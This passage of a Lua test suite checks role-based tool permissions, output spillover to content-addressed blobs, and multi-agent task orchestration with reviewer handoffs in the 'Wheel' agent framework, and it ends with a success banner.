  local root = "/tmp/bitty/test_tool_sandbox"
  os.execute("mkdir -p " .. root)

  -- Research role: strictly read-only (Inspect & Verify allowed; Modify & Execute denied)
  local env_research = { workspace_root = root, role = WheelAgent.Role.RESEARCH }

  -- Research attempts write_file -> MUST BE DENIED
  local res_write = reg:dispatch("write_file", { path = "test.txt", content = "data" }, env_research)
  assert(res_write.success == false)
  assert(res_write.status == WheelTool.OutcomeStatus.DENIED)
  assert(res_write.exit_code == 126)
  assert(string.find(res_write.stderr, "role_authority_violation", 1, true) ~= nil)
  assert(string.find(res_write.stderr, "read-only authority", 1, true) ~= nil)

  -- Research attempts run_command -> MUST BE DENIED
  local res_cmd = reg:dispatch("run_command", { command = "ls" }, env_research)
  assert(res_cmd.success == false)
  assert(res_cmd.status == WheelTool.OutcomeStatus.DENIED)
  assert(string.find(res_cmd.stderr, "role_authority_violation", 1, true) ~= nil)

  -- Research calls read_file (inspect) -> ALLOWED (fails on missing file, not authority)
  local res_read = reg:dispatch("read_file", { path = "nonexistent.txt" }, env_research)
  assert(res_read.status ~= WheelTool.OutcomeStatus.DENIED, "inspect intent allowed for Research")
  assert(string.find(res_read.stderr, "File not found", 1, true) ~= nil)

  -- Reviewer role: strictly read-only
  local env_reviewer = { workspace_root = root, role = WheelAgent.Role.REVIEWER }
  local rev_edit = reg:dispatch("edit_file", { path = "test.txt", target = "a", replacement = "b" }, env_reviewer)
  assert(rev_edit.success == false)
  assert(rev_edit.status == WheelTool.OutcomeStatus.DENIED)

  -- Commander role: plans and inspects; direct code modification denied
  local env_commander = { workspace_root = root, role = WheelAgent.Role.COMMANDER }
  local cmd_write = reg:dispatch("write_file", { path = "test.txt", content = "data" }, env_commander)
  assert(cmd_write.success == false)
  assert(cmd_write.status == WheelTool.OutcomeStatus.DENIED)
  assert(string.find(cmd_write.stderr, "role 'Commander' plans and orchestrates", 1, true) ~= nil)

  -- Coding Worker role: full access
  local env_coding = { workspace_root = root, role = WheelAgent.Role.CODING }
  local code_write = reg:dispatch("write_file", { path = "allowed.txt", content = "ok", overwrite = true }, env_coding)
  assert(code_write.success == true, "Coding role has modify authority")

  os.execute("rm -rf " .. root)
end)

-- ===========================================================================
-- 14. WheelTool: Auto-Spillover Pipeline & Content-Addressed Blob Recovery
-- ===========================================================================

run_test("WheelTool: Auto-spillover pipeline and content-addressed blob recovery", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local context = WheelContext.new({ kernel = kernel })

  -- Generate 6 KiB payload (150 lines > 4096 threshold)
  local line_pattern = "Record #%04d: Event telemetry outcome payload for pipeline\n"
  local lines = {}
  for i = 1, 150 do
    table.insert(lines, string.format(line_pattern, i))
  end
  local big_output = table.concat(lines)
  assert(#big_output > 4096, "output is over 4 KiB spillover threshold")

  -- Process outcome through spillover pipeline
  local outcome = WheelTool.process_spillover({
    tool = "run_command",
    intent = WheelTool.ActionIntent.EXECUTE,
    success = true,
    exit_code = 0,
    stdout = big_output,
    stderr = "",
    duration_ms = 45,
  }, {
    threshold_bytes = 4096,
    context = context,
    kernel = kernel,
  })

  assert(outcome.spilled == true, "outcome must be marked spilled")
  assert(outcome.spillover_bytes == #big_output)
  assert(type(outcome.spillover_hash) == "string")
  assert(#outcome.spillover_hash == 64, "spillover hash is 64 hex characters")

  -- Preview contains first 10 lines, notice, and last 5 lines
  assert(string.find(outcome.preview, "Record #0001:", 1, true) ~= nil, "preview contains head")
  assert(string.find(outcome.preview, "Record #0010:", 1, true) ~= nil)
  assert(string.find(outcome.preview, "spilled to blob: " .. outcome.spillover_hash, 1, true) ~= nil, "preview contains notice")
  assert(string.find(outcome.preview, "Record #0150:", 1, true) ~= nil, "preview contains tail")
  assert(string.find(outcome.preview, "Record #0050:", 1, true) == nil, "preview omits middle lines")

  -- Formatted observation contains tool header and preview
  local obs = outcome:format_observation()
  assert(string.find(obs, "[Tool: run_command (exit=0, 45ms, spilled=", 1, true) ~= nil)

  -- Content-addressed blob was written to context
  local slot = context:get_slot("blobs/" .. outcome.spillover_hash)
  assert(slot.found == true, "blob must be stored in context")
  assert(#slot.content == #big_output)

  -- read_blob tool recovers full content and slices
  local reg = WheelTool.get_default_registry()
  local blob_res = reg:dispatch("read_blob", {
    hash = outcome.spillover_hash,
    offset = 0,
    length = 50,
  }, { context = context })
  assert(blob_res.success == true)
  assert(#blob_res.stdout == 50)
  assert(string.find(blob_res.stdout, "Record #0001:", 1, true) ~= nil)
end)

-- ===========================================================================
-- 15. WheelAgent: execute_tool, call_tools, and Action Recording
-- ===========================================================================

run_test("WheelAgent: execute_tool, call_tools, and Action Recording", function()
  local root = "/tmp/bitty/test_agent_tools"
  os.execute("mkdir -p " .. root)
  local kernel = WheelKernel.new({ in_memory = true })
  local context = WheelContext.new({ kernel = kernel })

  local agent = WheelAgent.new({
    name = "dev-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    context = context,
    workspace = { root = root },
    tools = { "read_file", "write_file", "search_code", "run_command" },
  })

  assert(agent.tool_registry ~= nil, "agent has bound tool_registry")
  local st = agent:status()
  assert(st.tool_count >= 7)

  -- 1. agent:execute_tool writes a file
  local w_out = agent:execute_tool("write_file", {
    path = "workspace_note.md",
    content = "# Architecture Note\nDesign approved.",
    overwrite = true,
  })
  assert(w_out.success == true)
  assert(w_out.exit_code == 0)

  -- 2. agent:execute_tool reads file back
  local r_out = agent:execute_tool("read_file", { path = "workspace_note.md" })
  assert(r_out.success == true)
  assert(string.find(r_out.stdout, "# Architecture Note", 1, true) ~= nil)

  -- 3. agent:call_tools handles batch requests
  local batch_outcomes = agent:call_tools({
    { id = "call-1", name = "read_file", arguments = { path = "workspace_note.md" } },
    { id = "call-2", name = "search_code", arguments = { query = "Architecture", path = "." } },
  })
  assert(#batch_outcomes == 2)
  assert(batch_outcomes[1].call_id == "call-1")
  assert(batch_outcomes[1].success == true)
  assert(batch_outcomes[2].call_id == "call-2")
  assert(batch_outcomes[2].success == true)

  -- 4. Kernel recorded the executed actions
  local rec_actions = kernel:recent_actions() or {}
  assert(#rec_actions >= 3, "actions recorded in kernel")

  os.execute("rm -rf " .. root)
end)

-- ===========================================================================
-- 16. Multi-Agent Wave Orchestration Loop & Task Execution Pipeline
-- ===========================================================================

run_test("WheelTeam: run_orchestration_loop full diamond DAG wave orchestration", function()
  local kernel = WheelKernel.new({ in_memory = true })
  local team = WheelTeam.new({ kernel = kernel })

  -- Setup team of peer colleagues
  local cmd = team:spawn_agent({ name = "commander-01", role = WheelAgent.Role.COMMANDER })
  local coder1 = team:spawn_agent({ name = "worker-01", role = WheelAgent.Role.CODING })
  local coder2 = team:spawn_agent({ name = "worker-02", role = WheelAgent.Role.CODING })
  local reviewer = team:spawn_agent({ name = "reviewer-01", role = WheelAgent.Role.REVIEWER })

  -- Commander decomposes 4-task Diamond DAG
  -- T1 -> T2, T3 -> T4
  cmd:decompose_plan({
    { id = "T-SETUP", title = "Setup architecture and types", priority = 10 },
    { id = "T-MOD-A", title = "Implement subsystem Alpha", priority = 8, dependencies = { "T-SETUP" } },
    { id = "T-MOD-B", title = "Implement subsystem Beta", priority = 8, dependencies = { "T-SETUP" } },
    { id = "T-INTEG", title = "Integration and release", priority = 5, dependencies = { "T-MOD-A", "T-MOD-B" } },
  })

  local waves_started = {}
  local completed_events = {}

  local report = team:run_orchestration_loop({
    max_waves = 10,
    auto_reviewer = true,
    on_wave_start = function(wave_num, ready_count)
      table.insert(waves_started, { wave = wave_num, ready = ready_count })
    end,
    on_task_complete = function(task_id, outcome)
      table.insert(completed_events, task_id)
    end,
  })

  -- Verify orchestration report
  assert(report.success == true, "orchestration loop must succeed: " .. tostring(report.blocked_reason))
  assert(#report.completed_tasks == 4, "all 4 tasks completed")
  assert(#report.failed_tasks == 0, "zero failed tasks")
  assert(report.waves_executed >= 3, "must execute at least 3 topological waves (depth of diamond DAG)")
  assert(report.waves_calculated == 3, "calculated wave depth of diamond DAG must be 3")
  assert(report.total_handoffs == 4, "4 worker-to-reviewer verification handoffs must occur")
  assert(report.total_checkpoints >= 4, "checkpoints committed during worker completion and reviewer acceptance")
  assert(report.duration_ms >= 0, "duration reported")

  -- Verify all task statuses in kernel are succeeded
  local all_tasks = kernel:list_tasks()
  for _, t in ipairs(all_tasks) do
    local st = string.lower(t.status or "")
    assert(st == "succeeded", "task " .. t.id .. " must have succeeded status in kernel")
  end

  -- Verify context slots
  assert(team.context ~= nil)
  for _, tid in ipairs({ "T-SETUP", "T-MOD-A", "T-MOD-B", "T-INTEG" }) do
    local art_slot = team.context:get_slot("tasks/" .. tid .. "/artifacts")
    assert(art_slot.found == true, "artifacts slot for " .. tid .. " must exist")
    assert(#art_slot.content > 0, "artifacts slot for " .. tid .. " must not be empty")

    local ho_slot = team.context:get_slot("tasks/" .. tid .. "/handoff")
    assert(ho_slot.found == true, "handoff slot for " .. tid .. " must exist")
    assert(string.find(ho_slot.content, "to: reviewer-01", 1, true) ~= nil)

    local rev_slot = team.context:get_slot("tasks/" .. tid .. "/review")
    assert(rev_slot.found == true, "review slot for " .. tid .. " must exist")
    assert(string.find(rev_slot.content, "approved: true", 1, true) ~= nil)
  end

  local last_run_slot = team.context:get_slot("workspace/orchestration/last_run")
  assert(last_run_slot.found == true, "workspace last_run summary recorded")
  assert(string.find(last_run_slot.content, "success: true", 1, true) ~= nil)

  -- Verify all colleagues returned to idle state
  for _, a in ipairs(team:list_agents()) do
    assert(a.state == "idle", "agent " .. a.name .. " must return to idle state after loop")
    assert(a.active_task_id == nil)
  end
end)

run_test("WheelTeam: run_orchestration_loop failure blocking and deadlock handling", function()
  -- 1. Worker failure blocks downstream tasks
  local kernel1 = WheelKernel.new({ in_memory = true })
  local team1 = WheelTeam.new({ kernel = kernel1 })
  team1:spawn_agent({ name = "coder-01", role = WheelAgent.Role.CODING })
  team1:spawn_agent({ name = "reviewer-01", role = WheelAgent.Role.REVIEWER })

  kernel1:create_task({ id = "T-FAIL", title = "Failing task", priority = 10 })
  kernel1:create_task({ id = "T-DEP", title = "Dependent on failure", dependencies = { "T-FAIL" } })

  local report_fail = team1:run_orchestration_loop({
    step_fn = function(agent, ctx, iter)
      return {
        error = "compiler syntax error on line 42",
        done = false,
      }
    end,
  })

  assert(report_fail.success == false, "loop must fail when task fails")
  assert(#report_fail.completed_tasks == 0)
  assert(#report_fail.failed_tasks >= 1)
  assert(report_fail.failed_tasks[1] == "T-FAIL")
  assert(report_fail.blocked_reason ~= nil)
  assert(string.find(report_fail.blocked_reason, "blocking downstream", 1, true) ~= nil)

  -- Verify downstream task was cascaded to blocked
  local dep_task = kernel1:get_task("T-DEP")
  assert(string.lower(dep_task.status) == "blocked", "downstream task must be blocked by prerequisite failure")

  -- 2. Reviewer rejection fails task and blocks downstream
  local kernel2 = WheelKernel.new({ in_memory = true })
  local team2 = WheelTeam.new({ kernel = kernel2 })
  team2:spawn_agent({ name = "coder-01", role = WheelAgent.Role.CODING })
  team2:spawn_agent({ name = "reviewer-01", role = WheelAgent.Role.REVIEWER })

  kernel2:create_task({ id = "T-AUDIT", title = "Audit task" })
  kernel2:create_task({ id = "T-NEXT", title = "Next task", dependencies = { "T-AUDIT" } })

  local report_reject = team2:run_orchestration_loop({
    review_fn = function(agent, task, history)
      return false, "Security audit rejected: hardcoded credentials detected"
    end,
  })

  assert(report_reject.success == false, "loop must report failure when reviewer rejects")
  assert(#report_reject.failed_tasks >= 1)
  assert(report_reject.failed_tasks[1] == "T-AUDIT")

  -- 3. Empty DAG returns success immediately
  local kernel3 = WheelKernel.new({ in_memory = true })
  local team3 = WheelTeam.new({ kernel = kernel3 })
  team3:spawn_agent({ name = "coder-01", role = WheelAgent.Role.CODING })

  local report_empty = team3:run_orchestration_loop()
  assert(report_empty.success == true)
  assert(report_empty.waves_executed == 0)
  assert(#report_empty.completed_tasks == 0)

  -- 4. Fail closed when auto_reviewer is true but no reviewer colleague exists
  local kernel4 = WheelKernel.new({ in_memory = true })
  local team4 = WheelTeam.new({ kernel = kernel4 })
  team4:spawn_agent({ name = "solo-coder", role = WheelAgent.Role.CODING })
  kernel4:create_task({ id = "T-SOLO", title = "Solo task" })

  local report_no_rev = team4:run_orchestration_loop({ auto_reviewer = true })
  assert(report_no_rev.success == false)
  assert(#report_no_rev.failed_tasks == 1)
  assert(report_no_rev.failed_tasks[1] == "T-SOLO")

  -- 5. auto_reviewer = false releases task directly as succeeded without reviewer
  local kernel5 = WheelKernel.new({ in_memory = true })
  local team5 = WheelTeam.new({ kernel = kernel5 })
  team5:spawn_agent({ name = "solo-coder-2", role = WheelAgent.Role.CODING })
  kernel5:create_task({ id = "T-DIRECT", title = "Direct release task" })

  local report_direct = team5:run_orchestration_loop({ auto_reviewer = false })
  assert(report_direct.success == true)
  assert(#report_direct.completed_tasks == 1)
  assert(report_direct.completed_tasks[1] == "T-DIRECT")
end)

run_test("Wheel: Plugin command orchestrate registration and execution", function()
  -- Reset package cache to re-trigger command registration with mock bitty
  package.loaded["wheel.init"] = nil
  package.loaded["lua.wheel.init"] = nil

  local notifications = {}
  local registered_commands = {}

  _G.bitty = {
    commands = {
      register = function(def)
        registered_commands[def.id] = def
        return 1
      end,
    },
    notify = {
      show = function(payload)
        table.insert(notifications, payload)
        return true
      end,
    },
  }

  local wheel = require("wheel.init")
  assert(registered_commands["orchestrate"] ~= nil, "orchestrate command must be registered")
  assert(registered_commands["orchestrate"].title == "Wheel: orchestrate")

  -- Initialize a plan
  registered_commands["plan"].run()
  assert(#wheel.kernel:list_tasks() == 3)

  -- Run orchestrate command
  registered_commands["orchestrate"].run()
  local last_notif = notifications[#notifications]
  assert(last_notif ~= nil)
  assert(last_notif.title == "Wheel Orchestration")
  assert(string.find(last_notif.body, "completed successfully", 1, true) ~= nil)

  -- Clean up global
  _G.bitty = nil
end)

print("\n==========================================")
print("  All Wheel tests PASSED successfully! 🚀 ")
print("==========================================")


